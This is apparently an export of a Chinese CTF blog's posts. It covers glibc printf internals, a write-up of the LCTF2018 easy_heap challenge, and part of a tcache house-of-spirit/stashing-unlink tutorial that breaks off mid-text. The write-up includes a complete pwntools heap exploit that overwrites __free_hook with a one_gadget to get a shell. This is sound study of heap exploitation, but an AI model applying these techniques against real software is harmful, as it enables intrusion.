style="zoom:80%;"><p>fp是用fopen打开的一个文件，可以看到实际已经变成_IO_FILE_puls加入链表，这里的stdin、stdout、stderr，fp的vtable指向_IO_jump_t类型结构体_IO_file_jumps</p><p><img src="/2023/03/29/IO-FILE/image-20230329200421200.png" alt="image-20230329200421200"></p><blockquote><p>printf&#x2F;puts 最终会调用<code>_IO_file_xsputn</code></p><p>fclose 最终会调用<code>_IO_FILE_FINISH</code></p><p>fwrite 最终会调用<code>_IO_file_xsputn</code></p><p>fread 最终会调用<code>_IO_file_xsgetn</code></p><p>scanf&#x2F;gets 最终会调用<code>_IO_file_xsgetn</code></p></blockquote><p>先不做源码分析，先单步看一下printf函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//梦开始的地方，呜呜</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/IO-FILE/image-20230330001602270.png" alt="image-20230330001602270"></p><p><strong>_IO_file_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233744967.png" alt="image-20230329233744967"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233840601.png" alt="image-20230329233840601"></p><p><strong>_IO_doallocbuf</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233956755.png" alt="image-20230329233956755"></p><p><strong>_IO_file_doallocate</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234222565.png" alt="image-20230329234222565"></p><p><strong>_IO_file_stat</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234850989.png" alt="image-20230329234850989"></p><p><strong>__fxstat64</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235004997.png" alt="image-20230329235004997"></p><p><strong>malloc@plt</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235217971.png" alt="image-20230329235217971"></p><p><strong>_IO_setb</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235450171.png" alt="image-20230329235450171"></p><p><strong>_IO_do_write</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235615761.png" alt="image-20230329235615761"></p><p><strong>_IO_default_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235927623.png" alt="image-20230329235927623"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230330000048279.png" alt="image-20230330000048279"></p><p>下面会循环IO_file_overflow，这个调用就是一个字节一个字节往我们malloc的堆块(缓冲区)里写我们的输出</p><p><img src="/2023/03/29/IO-FILE/image-20230330001359527.png" alt="image-20230330001359527"></p><p>最后会调用我们的write做系统调用输出</p><p><img src="/2023/03/29/IO-FILE/image-20230330001235259.png" alt="image-20230330001235259"></p><p><strong>WTF</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache LCTF2018-PWN-easy_heap</title>
      <link href="/2023/03/28/LCTF2018-PWN-easy-heap/"/>
      <url>/2023/03/28/LCTF2018-PWN-easy-heap/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ">https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ</a><br>提取码：cc8v</p><p>十个堆块一直在变位置，有点绕啊</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/heap&gt; checksec easy_heap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/easy_heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id="大致情况"><a href="#大致情况" class="headerlink" title="大致情况"></a>大致情况</h2><p>最多十个堆块</p><p>malloc时存在一个null byte overflow，申请固定大小0xF8堆块，a1[a2] &#x3D; 0;正好可以覆盖下一个堆块的inuse位为0</p><p>管理结构在0x202050处</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">    <span class="title">malloc_point</span></span></span><br><span class="line"><span class="class">    <span class="title">size</span></span></span><br></pre></td></tr></table></figure><p>没有其他漏洞了</p><p><strong>大致思路是修改掉一个堆块的prevsize和inuse位，放入unsortedbin，利用unlink放入把一个中间的隔块污染放到unsorted链里来利用,泄露libc的同时构成double free，其实术语应该叫tcache dup，但是哥们感觉double free更形象一点</strong></p><h2 id="overlapping-heap-chunk隔块攻击泄露libc"><a href="#overlapping-heap-chunk隔块攻击泄露libc" class="headerlink" title="overlapping heap chunk隔块攻击泄露libc"></a>overlapping heap chunk隔块攻击泄露libc</h2><p>先申请十个堆块0-9</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>把下面地址当成我们的chunk0-9基地址</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232549777.png" alt="image-20230328232549777"></p><p>再把0-5释放掉，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p>再释放9(释放9是为了防止直接释放789，会和topchunk合并，9进入tcachebin inuse位不置空)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224546593.png" alt="image-20230328224546593"></p><p>tacache满了再释放6 7 8</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224823292.png" alt="image-20230328224823292"></p><p>为什么只有chunk6呢？678相邻释放完6再释放7，8前面的堆块为free状态，会触发unlinke</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328225833809.png" alt="image-20230328225833809"></p><p>十个chunk都释放掉了</p><p>再把tcache chunk的7个chunk申请出来，我们才可以接触到unsort bin的chunk，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>把三个都申请出来作为chunk 7 8 9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232149288.png" alt="image-20230328232149288"></p><p>这个时候chunk8((0x555555757b00))的inuse位为1，presize为0x200，可以把他前面的chunk7(0x555555757a00)申请出来，就可以覆盖chunk8(0x555555757b00)的inuse位</p><p>需要把前面8个chunk申请出来，才可以拿到chunk7(0x555555757a00)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">6</span>)</span>:</span><br><span class="line">       <span class="title function_">delete</span><span class="params">(i)</span></span><br></pre></td></tr></table></figure><p>delete(8)</p><p>delete(7)</p><p>这里先释放8(0x555555757a00)有几点原因</p><ul><li>可以填满填满tcache，7(0x555555757900)进入unsortbin，会有fd和bk指针写入unsortedbin地址</li><li>下一次会先申请到8(0x555555757a00)，来覆盖chunk8(0x555555757b00)的inuse位</li></ul><p><code>new(0xf8,b&#39;null-byte-overflow&#39;)</code></p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328235322081.png" alt="image-20230328235322081"></p><p>目前申请到的0为0x555555757a00，0x555555757b00 previnuse位为0，也就是说0被污染为未使用实际却是使用状态，prevsize是0x200大小，0x555555757900也是free，</p><p>这个时候释放9(0x555555757b00)会触发unlinke,0x555555757900,0x555555757a00，0x555555757b00合并为一个大堆块，这样我们就可以强制把0x555555757a00加入unsortedbin里</p><p>delete(6)</p><p>delete(9)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329002903347.png" alt="image-20230329002903347"></p><p>这个时候再把0x555555757900申请出来，0x555555757a00会挂上链，fd和bk会有bin值，这时候0x555555757a00还在0处使用就可以show泄露unsortedbin了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#拿走tcachebin里的</span></span><br><span class="line">    new(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;900&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>通过__malloc_hook和main_arean和unsortedbin的偏移找到libc基址</p><h2 id="double-free-amp-amp-free-hook"><a href="#double-free-amp-amp-free-hook" class="headerlink" title="double free &amp;&amp; __free_hook"></a>double free &amp;&amp; __free_hook</h2><p>目前state是这样的</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329004708034.png" alt="image-20230329004708034"></p><p>再去申请一个堆不就可以double free了吗</p><p>**你可能会问我们之前不是在 <a href="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/">https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/</a> 说过unbutu18被patch掉了吗，怎么还能double free **</p><blockquote><p>我们注意到在程序delete时</p><p><code> memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8));</code></p><p>这一句就帮助我们绕过double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在检测doublefree时最简单的就是每一次释放都去遍历一下单链表，但是这样效率太低了，毕竟tcache的出现就是为了速度，ptmalloc2为了效率，在e-&gt;key &#x3D;&#x3D; tcache时才会进行检测double free，因为在使用状态的chunk，e-&gt;key是数据区，基本上是不会满足-&gt;key &#x3D;&#x3D; tcache的，64位程序只有2^48-1分之一的概率，使用状态的也没必要检测double free</p><p>memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8)这一句会帮我们把原本要释放的key抹除掉，e-&gt;key !&#x3D; tcache自然不会检测doublefree</p></blockquote><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329005141653.png" alt="image-20230329005141653"></p><p>free掉0和9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329014936412.png" alt="image-20230329014936412"></p><p>new(0x10, p64(libc.dump(‘__free_hook’)+base))写入hook到单链表</p><p>new(0x10, ‘fuck’)</p><p>把a10拿出来</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329015143119.png" alt="image-20230329015143119"></p><p>由于在满员下释放了两个堆，又申请了两个，满员了，free掉0和9之前需要再释放几个堆才可以申请下一个</p><p>new(0x10, p64(one_gadget))就可以申请到__free_hook-0x10去，hook掉了__free_hook为onegadget</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329125937130.png" alt="image-20230329125937130"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./easy_heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">        io.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;null-byte-overflow&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0x10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;900&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line">main_arean=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">malloc_hook=main_arean-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;main_arean&#x27;</span>,main_arean)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base=malloc_hook-libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)+base))</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;fuck&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">one_gadget=base+<span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
            <tag> Null Byte Overflow </tag>
            
            <tag> Overlapping Heap Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache house of spirit &amp;&amp; Tcache stashing unlink attack</title>
      <link href="/2023/03/27/Tcache_house_of_spirit-unlink/"/>
      <url>/2023/03/27/Tcache_house_of_spirit-unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-house-of-spirit"><a href="#Tcache-house-of-spirit" class="headerlink" title="Tcache house of spirit"></a>Tcache house of spirit</h2><p>how2heap tcache_house_of_spirit.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Starting program: /mnt/hgfs/Share/how2heap/glibc_2<span class="number">.27</span>/tcache_house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack on tcache.</span><br><span class="line">It works in a similar way to original house of spirit but you don<span class="number">&#x27;</span>t need to create fake chunk after the fake chunk that will be freed.</span><br><span class="line">You can see this in <span class="built_in">malloc</span>.c in function _int_free that tcache_put is called without checking <span class="keyword">if</span> next chunk<span class="number">&#x27;</span>s size and prev_inuse are sane.</span><br><span class="line">(Search <span class="keyword">for</span> strings <span class="string">&quot;invalid next size&quot;</span> and <span class="string">&quot;double free or corruption&quot;</span>)</span><br><span class="line"></span><br><span class="line">Ok. Let<span class="number">&#x27;</span>s start with the example!.</span><br><span class="line"></span><br><span class="line">Calling <span class="title function_">malloc</span><span class="params">()</span> once so that it sets up its memory.</span><br><span class="line">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It&#x27;s size field is placed at 0x7fffffffdee8</span><br><span class="line">This chunk size has to be falling into the tcache <span class="title function_">category</span> <span class="params">(chunk.size &lt;= <span class="number">0x410</span>; <span class="built_in">malloc</span> arg &lt;= <span class="number">0x408</span> on x64)</span>. The <span class="title function_">PREV_INUSE</span> <span class="params">(lsb)</span> bit is ignored by <span class="built_in">free</span> <span class="keyword">for</span> tcache chunks, however the <span class="title function_">IS_MMAPPED</span> <span class="params">(second lsb)</span> and <span class="title function_">NON_MAIN_ARENA</span> <span class="params">(third lsb)</span> bits cause problems.</span><br><span class="line">... note that this has to be the size of the next <span class="built_in">malloc</span> request rounded to the internal size used by the <span class="built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="keyword">for</span> the <span class="built_in">malloc</span> parameter at the end.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdee8.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7fffffffdee8, which will be 0x7fffffffdef0!</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7fffffffdef0</span><br><span class="line">[Inferior 1 <span class="params">(process <span class="number">6552</span>)</span> exited normally]</span><br></pre></td></tr></table></figure><p>额，比fastbin简单多了</p><p>伪造完成</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327160459074.png" alt="image-20230327160459074"></p><h2 id="Tcache-stashing-unlink-attack"><a href="#Tcache-stashing-unlink-attack" class="headerlink" title="Tcache stashing unlink attack"></a>Tcache stashing unlink attack</h2><p>how2heap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the 